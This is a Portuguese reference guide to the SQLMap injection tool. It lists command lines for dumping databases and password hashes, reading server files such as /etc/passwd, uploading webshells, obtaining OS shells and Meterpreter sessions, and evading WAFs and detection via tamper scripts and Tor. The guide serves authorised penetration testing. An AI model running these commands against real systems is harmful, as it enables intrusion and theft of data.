# 💉 SQLMap — Guia de referência completo

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   _____ ____    __    __  __           
  / ___// __ \  / /   /  |/  /___ _____ 
  \__ \/ / / / / /   / /|_/ / __ `/ __ \
 ___/ / /_/ / / /___/ /  / / /_/ / /_/ /
/____/\___\_\/_____/_/  /_/\__,_/ .___/ 
                               /_/      
    Ferramenta automática de injeção SQL
```

<p align="center">
  <img src="https://img.shields.io/badge/SQLMap-Injection-red?style=for-the-badge" alt="SQLMap">
  <img src="https://img.shields.io/badge/SQL-Injection-orange?style=for-the-badge" alt="SQL Injection">
  <img src="https://img.shields.io/badge/Python-Tool-blue?style=for-the-badge&logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🔥 Uma ferramenta poderosa para automatizar testes de injeção SQL</b>
</p>

> **Termos e notas de versão:** SQLi é injeção SQL; WAF filtra tráfego de aplicações web, e scripts tamper transformam payloads. Segundo a [documentação oficial](https://github.com/sqlmapproject/sqlmap/wiki/Usage), `--output-dir` seleciona o diretório de saída; para escolher HTML usa-se `--dump-format=HTML`. O exemplo «Guardar em HTML» do original não seleciona esse formato. Em «Ler o registo», `-reg-key` é um erro tipográfico: a opção é `--reg-key`. `--identify-waf` é uma opção histórica que não consta das opções atuais documentadas; confirmar as opções da versão utilizada. `--level` e `--risk` aumentam a cobertura e podem alterar o impacto dos testes, sem garantir que todos os contextos sejam testados. Acesso a ficheiros e ao sistema operativo depende do SGBD e dos privilégios. As descrições dos scripts tamper são resumos, não garantias de contorno. Os exemplos originais foram preservados.

---

<a id="-table-of-contents"></a>
## 📋 Índice

- [Introdução](#-introduction)
- [Instalação](#-installation)
- [Sintaxe básica](#-basic-syntax)
- [Opções de alvo](#-target-options)
- [Opções de pedido](#-request-options)
- [Opções de deteção](#-detection-options)
- [Enumeração](#-enumeration)
- [Extração de dados](#-data-extraction)
- [Operações sobre ficheiros](#-file-operations)
- [Acesso ao sistema operativo](#-os-access)
- [Técnicas de contorno de proteções](#-bypass-techniques)
- [Scripts tamper](#-tamper-scripts)
- [Exemplos práticos](#-real-world-examples)
- [Referência rápida](#-quick-reference)
- [Conselhos e boas práticas](#-tips--best-practices)
- [Recursos](#-resources)

---

<a id="-introduction"></a>
## 🎯 Introdução

**SQLMap** é uma ferramenta de testes de intrusão de código aberto que automatiza a deteção e exploração de vulnerabilidades de injeção SQL.

### Funcionalidades principais

| Funcionalidade | Descrição |
|---------|-------------|
| **Deteção automática** | Deteta automaticamente vulnerabilidades de injeção SQL |
| **Bases de dados suportadas** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite e outras |
| **Controlo completo** | Identificação da base de dados, extração de dados e acesso ao sistema operativo |
| **Técnicas de contorno de proteções** | Contorno de WAF/IPS com scripts tamper |
| **Vários tipos de injeção** | Boolean, Error, Union, Stacked e Time-based (ver tabela de tipos) |

### Bases de dados suportadas

```
✅ MySQL          ✅ PostgreSQL      ✅ Microsoft SQL Server
✅ Oracle         ✅ SQLite          ✅ IBM DB2
✅ SAP MaxDB      ✅ Firebird        ✅ Sybase
✅ HSQLDB         ✅ Informix        ✅ H2
```

### Tipos de injeção SQL

| Tipo | Código | Descrição |
|------|------|-------------|
| Injeção cega baseada em condições booleanas | `B` | Respostas verdadeiro/falso |
| Baseada em erros | `E` | Erros da base de dados na resposta |
| Baseada em consultas UNION | `U` | Injeção através de UNION SELECT |
| Consultas encadeadas | `S` | Várias consultas separadas por ponto e vírgula (;) |
| Injeção cega baseada no tempo | `T` | Atrasos no tempo de resposta |
| Consultas embutidas | `Q` | Consultas embutidas (aninhadas) |

---

<a id="-installation"></a>
## 📥 Instalação

### Kali Linux (pré-instalado)
```bash
# Atualizar o SQLMap
sudo apt update && sudo apt install sqlmap
```

### A partir do GitHub (versão mais recente)
```bash
# Clonar o repositório
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Executar o SQLMap
cd sqlmap-dev
python sqlmap.py --version
```

### Utilizar pip
```bash
pip install sqlmap
```

### Docker
```bash
docker pull paoloo/sqlmap
docker run -it paoloo/sqlmap -u "http://target.com/page?id=1"
```

### Verificar a instalação
```bash
sqlmap --version
sqlmap -h          # Ajuda básica
sqlmap -hh         # Ajuda avançada
```

---

<a id="-basic-syntax"></a>
## ⌨️ Sintaxe básica

### Sintaxe geral
```bash
sqlmap [options] -u "URL" 
sqlmap [options] -r request.txt
```

### Exemplos para começar
```bash
# Análise básica
sqlmap -u "http://target.com/page.php?id=1"

# Analisar com um cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Analisar um pedido POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Analisar a partir de um ficheiro
sqlmap -r request.txt

# Modo totalmente automático
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

<a id="-target-options"></a>
## 🎯 Opções de alvo

### URL alvo (-u)
```bash
# URL básico
sqlmap -u "http://target.com/page.php?id=1"

# Vários parâmetros
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Indicar o parâmetro a testar
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Testar todos os parâmetros
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Ficheiro de pedido (-r)
```bash
# Guardar o pedido do Burp Suite num ficheiro
# Depois, analisar:
sqlmap -r request.txt

# Exemplo de ficheiro de pedido:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Google Dork (-g)
```bash
# Pesquisar e testar resultados do Google
sqlmap -g "inurl:page.php?id="

# Com páginas específicas
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Ligação direta à base de dados (-d)
```bash
# Ligar diretamente à base de dados
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Vários alvos (-m)
```bash
# Ficheiro com vários URL
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Ficheiro de configuração (-c)
```bash
# Utilizar um ficheiro de configuração
sqlmap -c sqlmap.conf
```

---

<a id="-request-options"></a>
## 📡 Opções de pedido

### Método HTTP e dados
```bash
# Dados POST
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Indicar o método
sqlmap -u "http://target.com/api/user/1" --method=PUT

# Dados JSON
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies
```bash
# Um cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Vários cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Carregar cookies de um ficheiro
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Testar um parâmetro de cookie
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Cabeçalhos
```bash
# Cabeçalho personalizado
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Vários cabeçalhos
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# User-Agent aleatório
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Autenticação
```bash
# Autenticação Basic
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Autenticação Digest
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# Autenticação NTLM
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# Proxy HTTP
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Proxy SOCKS
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Verificar o Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

<a id="-detection-options"></a>
## 🔍 Opções de deteção

### Nível e risco
```bash
# Nível (1–5) — Quantidade de testes
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risco (1–3) — Potencial impacto dos testes
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Indicação do original para testes aprofundados
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Nível | Testes |
|-------|-------|
| 1 | Predefinido — Testes básicos |
| 2 | + Testes de cookies |
| 3 | + Testes de User-Agent e Referer |
| 4 | + Mais payloads |
| 5 | + Todos os payloads |

| Risco | Descrição |
|------|-------------|
| 1 | Predefinido — Testes de menor risco |
| 2 | + Testes temporais mais pesados |
| 3 | + Testes baseados em OR (podem modificar dados!) |

### Seleção de técnicas
```bash
# Técnica específica
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Apenas UNION
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Apenas booleanos
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Apenas erros
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Apenas baseada no tempo
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Apenas consultas encadeadas

# Várias técnicas
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Todas as técnicas (predefinido)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Atrasos temporais
```bash
# Tempo da injeção baseada no tempo (predefinido: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Atraso entre pedidos
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Threads (linhas de execução)
```bash
# Ligações simultâneas (predefinido: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

<a id="-enumeration"></a>
## 📊 Enumeração

### Enumeração de bases de dados
```bash
# Obter a base de dados atual
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Obter o utilizador atual
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Verificar se o utilizador é administrador da base de dados (DBA)
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# Listar todas as bases de dados
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Listar todos os utilizadores
sqlmap -u "http://target.com/page.php?id=1" --users

# Listar palavras-passe dos utilizadores
sqlmap -u "http://target.com/page.php?id=1" --passwords

# Listar os privilégios
sqlmap -u "http://target.com/page.php?id=1" --privileges

# Listar as funções
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Enumeração de tabelas
```bash
# Listar as tabelas da base de dados
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Listar todas as tabelas
sqlmap -u "http://target.com/page.php?id=1" --tables

# Contar os registos das tabelas
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Enumeração de colunas
```bash
# Listar as colunas da tabela
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Pesquisar nomes de colunas
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Extração do esquema
```bash
# Extrair o esquema da base de dados
sqlmap -u "http://target.com/page.php?id=1" --schema

# Excluir bases de dados do sistema
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

<a id="-data-extraction"></a>
## 📤 Extração de dados

### Extrair dados
```bash
# Extrair uma tabela específica
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Extrair colunas específicas
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Extrair todas as tabelas da base de dados
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Extrair tudo
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Excluir bases de dados do sistema
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Limitar os resultados
```bash
# Primeiras 10 linhas
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Linhas 5–15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# Cláusula WHERE
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Consultas SQL personalizadas
```bash
# Executar uma consulta SQL
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Shell SQL interativa
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Formatos de saída
```bash
# Guardar em CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Guardar em HTML (descrição do original; ver nota)
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

<a id="-file-operations"></a>
## 📁 Operações sobre ficheiros

### Ler ficheiros
```bash
# Ler um ficheiro do servidor
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Ler ficheiros Windows
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Ler a configuração web
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Escrever ficheiros
```bash
# Escrever um ficheiro no servidor
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Carregar uma webshell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

<a id="-os-access"></a>
## 💻 Acesso ao sistema operativo

### Execução de comandos
```bash
# Executar um comando do sistema operativo
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Shell interativa
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell em Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Sessão Meterpreter
```bash
# Obter uma sessão Meterpreter
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# Com opções específicas
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB Relay
```bash
# Ataque de retransmissão SMB (SMB relay)
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Acesso ao registo (Windows)
```bash
# Ler o registo
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Adicionar uma chave de registo
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Eliminar uma chave de registo
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

<a id="-bypass-techniques"></a>
## 🛡️ Técnicas de contorno de proteções

### Contorno de WAF/IPS
```bash
# Identificar o WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Ignorar a deteção de WAF
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Maiúsculas/minúsculas aleatórias
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Vários scripts tamper
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

<a id="-tamper-scripts"></a>
### Scripts tamper comuns
```bash
# Codificação URL
--tamper=charencode

# Dupla codificação URL
--tamper=chardoubleencode

# Codificação Unicode
--tamper=charunicodeencode

# Substituir espaços por comentários
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Alteração de maiúsculas/minúsculas
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Substituir palavras-chave
--tamper=between
--tamper=equaltolike
```

### Referência de scripts tamper

| Script | Descrição |
|--------|-------------|
| `apostrophemask` | Substituir o apóstrofo pela representação UTF-8 |
| `apostrophenullencode` | Substituir o apóstrofo por dupla codificação Unicode |
| `base64encode` | Codificar o payload em Base64 |
| `between` | Substituir `>` por `NOT BETWEEN 0 AND #` |
| `charencode` | Codificar todos os caracteres como URL |
| `charunicodeencode` | Codificar como Unicode-URL |
| `concat2concatws` | Substituir `CONCAT` por `CONCAT_WS` |
| `equaltolike` | Substituir `=` por `LIKE` |
| `greatest` | Substituir `>` por `GREATEST` |
| `halfversionedmorekeywords` | Adicionar um comentário MySQL com indicação de versão |
| `ifnull2ifisnull` | Substituir `IFNULL` por `IF(ISNULL())` |
| `lowercase` | Converter palavras-chave para minúsculas |
| `modsecurityversioned` | Contornar o ModSecurity com um comentário com indicação de versão |
| `modsecurityzeroversioned` | Contornar o ModSecurity com um comentário cuja versão é zero |
| `percentage` | Adicionar o sinal de percentagem antes dos caracteres |
| `randomcase` | Alternar aleatoriamente maiúsculas/minúsculas nas palavras-chave |
| `randomcomments` | Adicionar comentários aleatórios às palavras-chave SQL |
| `securesphere` | Acrescentar uma cadeia especial para contornar o SecureSphere |
| `space2comment` | Substituir o espaço por `/**/` |
| `space2dash` | Substituir o espaço por um comentário `--` |
| `space2hash` | Substituir o espaço por um comentário `#` |
| `space2morehash` | Substituir o espaço por `#` e uma mudança de linha |
| `space2mssqlblank` | Substituir o espaço por caracteres em branco do MSSQL |
| `space2mssqlhash` | Substituir o espaço por `#` e uma mudança de linha (MSSQL) |
| `space2plus` | Substituir o espaço por `+` |
| `space2randomblank` | Substituir o espaço por um carácter em branco aleatório |
| `symboliclogical` | Substituir `AND`/`OR` por `&&`/`||` |
| `unionalltounion` | Substituir `UNION ALL` por `UNION` |
| `unmagicquotes` | Substituir a aspa pela sequência multibyte `%bf%27` |
| `uppercase` | Converter palavras-chave para maiúsculas |
| `versionedkeywords` | Envolver as palavras-chave num comentário com indicação de versão |
| `versionedmorekeywords` | Envolver mais palavras-chave num comentário com indicação de versão |
| `xforwardedfor` | Adicionar um cabeçalho `X-Forwarded-For` falso |

---

<a id="-real-world-examples"></a>
## 🎬 Exemplos práticos

### Exemplo 1: análise básica
```bash
# Analisar em modo automático
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Exemplo 2: extração completa da base de dados
```bash
# Enumerar e extrair
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# Depois de encontrar a base de dados
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Extrair a tabela de utilizadores
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Exemplo 3: pedido POST com cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Exemplo 4: através do proxy do Burp
```bash
# Guardar o pedido do Burp num ficheiro e, depois:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Exemplo 5: contorno de WAF
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Exemplo 6: obter uma shell do sistema operativo
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Exemplo 7: ler ficheiros sensíveis
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos essenciais

| Comando | Descrição |
|---------|-------------|
| `-u URL` | URL alvo com parâmetro |
| `-r FILE` | Carregar o pedido de um ficheiro |
| `--data=DATA` | Dados POST |
| `--cookie=COOKIE` | Cookie HTTP |
| `--dbs` | Listar bases de dados |
| `--tables` | Listar tabelas |
| `--columns` | Listar colunas |
| `--dump` | Extrair dados |
| `-D DB` | Indicar a base de dados |
| `-T TABLE` | Indicar a tabela |
| `-C COLS` | Indicar as colunas |
| `--batch` | Modo não interativo |

### Opções de deteção

| Opção | Descrição |
|--------|-------------|
| `--level=LEVEL` | Nível de teste (1–5) |
| `--risk=RISK` | Nível de risco (1–3) |
| `-p PARAM` | Parâmetro a testar |
| `--technique=TECH` | Técnica de injeção |
| `--threads=N` | Threads simultâneas |

### Opções de saída

| Opção | Descrição |
|--------|-------------|
| `-v LEVEL` | Nível de detalhe (0–6) |
| `--batch` | Não solicitar respostas interativas |
| `--flush-session` | Limpar a cache da sessão |
| `--output-dir=DIR` | Diretório de saída personalizado |

---

<a id="-tips--best-practices"></a>
## 💡 Conselhos e boas práticas

### Conselhos de desempenho

1. **Começar pelo mais simples**
   ```bash
   # Começar com um nível baixo
   sqlmap -u "URL" --level=1 --batch
   # Aumentar se necessário
   ```

2. **Utilizar --batch para automatizar**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Poupar tempo com testes específicos**
   ```bash
   # Testar apenas injeção baseada em UNION
   sqlmap -u "URL" --technique=U
   ```

### Conselhos para reduzir a exposição

1. **User-Agent aleatório**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Adicionar um atraso**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Utilizar Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Resolução de problemas

| Problema | Solução |
|-------|----------|
| Não foi encontrada injeção | Aumentar `--level` e `--risk` |
| Bloqueio pelo WAF | Utilizar scripts `--tamper` |
| Análise lenta | Reduzir `--level` e selecionar uma `--technique` específica |
| Problemas de ligação | Verificar `--timeout` e `--retries` |

---

<a id="-legal-disclaimer"></a>
## ⚠️ Aviso legal

> **AVISO:** O SQLMap é uma ferramenta poderosa que deve ser utilizada apenas em **testes autorizados**.
> 
> - ✅ Testar sistemas que lhe pertencem
> - ✅ Testar com autorização escrita explícita
> - ✅ Utilizar em trabalhos de testes de intrusão legalmente autorizados
> - ❌ Nunca utilizar em sistemas sem autorização
> - ❌ Nunca utilizar para fins maliciosos
> 
> **O acesso não autorizado a sistemas informáticos é ilegal e punível por lei.**

---

<a id="-resources"></a>
## 📚 Recursos

### Recursos oficiais
- [Site oficial do SQLMap](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### Recursos de aprendizagem
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Guias de referência relacionados
- [Metasploit Framework](../../Metasploit/README.md)
- [Meterpreter](../../Metasploit/Meterpreter.md)

---

<p align="center">
  <b>💉 Domine os testes de injeção SQL!</b><br>
  <i>Um grande poder exige uma grande responsabilidade</i>
</p>
